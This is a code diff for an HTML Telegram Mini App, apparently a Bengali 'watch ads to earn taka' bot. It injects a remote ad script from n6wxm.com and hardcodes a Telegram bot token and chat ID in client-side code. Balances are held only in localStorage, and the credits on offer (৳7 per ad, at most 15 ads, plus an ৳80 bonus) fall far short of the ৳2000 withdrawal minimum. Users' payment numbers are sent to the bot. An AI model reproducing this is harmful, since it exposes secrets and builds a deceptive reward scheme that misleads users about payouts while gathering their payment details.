@@ -7,6 +7,7 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="style.css">
+    <script>(function(s){s.dataset.zone='11062752',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
 </head>
 <body>
 
@@ -109,7 +110,6 @@
         tg.ready();
         tg.expand();
         
-        // ইউজার প্রোফাইল ও পিকচার লোড
         if(tg.initDataUnsafe && tg.initDataUnsafe.user) {
             document.getElementById('username').innerText = tg.initDataUnsafe.user.first_name;
             if(tg.initDataUnsafe.user.photo_url) {
@@ -118,3 +118,99 @@
                 photo.src = tg.initDataUnsafe.user.photo_url;
                 photo.style.display = 'block';
             }
+        }
+
+        const baseBotUrl = "https://t.me/Freetaka12bot/app";
+        document.getElementById('ref-url').value = baseBotUrl + "?startapp=" + (tg.initDataUnsafe?.user?.id || "guest");
+
+        let balance = parseFloat(localStorage.getItem('user_balance')) || 0.00;
+        let adsWatched = parseInt(localStorage.getItem('ads_watched')) || 0;
+        let totalRefers = parseInt(localStorage.getItem('total_refers')) || 0;
+        let channelClaimed = localStorage.getItem('channel_claimed') === 'true';
+
+        function loadWithdrawStatus() {
+            const status = localStorage.getItem('withdraw_status');
+            const amount = localStorage.getItem('withdraw_amount');
+            if(status) {
+                document.getElementById('withdraw-status').innerHTML = `
+                    <div style="background: ${status === 'Approved' ? '#d4edda' : '#fff3cd'}; padding: 10px; border-radius: 5px; border: 1px solid #ccc;">
+                        <p>পরিমাণ: ৳${amount}</p>
+                        <p>স্ট্যাটাস: <b>${status}</b></p>
+                    </div>
+                `;
+            }
+        }
+
+        window.onload = () => {
+            updateUI();
+            loadWithdrawStatus();
+            if(channelClaimed) document.getElementById('join-btn').style.display = 'none';
+        };
+
+        function updateUI() {
+            document.getElementById('user-balance').innerText = balance.toFixed(2);
+            document.getElementById('total-balance').innerText = balance.toFixed(2);
+            document.getElementById('ads-count').innerText = adsWatched;
+            document.getElementById('refer-count').innerText = totalRefers;
+        }
+
+        function requestWithdraw() {
+            const amount = document.getElementById('w-amount').value;
+            const number = document.getElementById('w-number').value;
+            const username = tg.initDataUnsafe?.user?.first_name || "Guest";
+
+            if(amount < 2000) { alert("মিনিমাম ২০০০ টাকা!"); return; }
+
+            const botToken = "7781976251:AAE-_5OIumWZpVkmwJ6iZbAu3mOONB6rAwY";
+            const chatId = "8741023890";
+            const message = `🔔 *নতুন উইথড্র রিকোয়েস্ট*%0A👤 ইউজার: ${username}%0A💳 নাম্বার: ${number}%0A💰 পরিমাণ: ৳${amount}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`)
+            .then(res => {
+                if(res.ok) {
+                    localStorage.setItem('withdraw_status', 'Pending');
+                    localStorage.setItem('withdraw_amount', amount);
+                    loadWithdrawStatus();
+                    alert("রিকোয়েস্ট পাঠানো হয়েছে!");
+                }
+            });
+        }
+
+        function enableClaim() { if(!channelClaimed) document.getElementById('claim-btn').style.display = 'block'; }
+
+        function claimBonus() {
+            balance += 80.00;
+            channelClaimed = true;
+            localStorage.setItem('user_balance', balance);
+            localStorage.setItem('channel_claimed', 'true');
+            document.getElementById('join-btn').style.display = 'none';
+            document.getElementById('claim-btn').style.display = 'none';
+            updateUI();
+            alert("৳৮০ বোনাস পেয়েছেন!");
+        }
+
+        function copyRef() {
+            const copyText = document.getElementById("ref-url");
+            copyText.select();
+            document.execCommand("copy");
+            alert("লিংক কপি হয়েছে!");
+        }
+
+        function showMonetagAd() {
+            if (adsWatched >= 15) { alert("লিমিট শেষ!"); return; }
+            balance += 7.00;
+            adsWatched += 1;
+            localStorage.setItem('user_balance', balance);
+            localStorage.setItem('ads_watched', adsWatched);
+            updateUI();
+        }
+
+        function switchScreen(screenId, element) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            document.getElementById(screenId).classList.add('active');
+            element.classList.add('active');
+        }
+    </script>
+</body>
+</html>
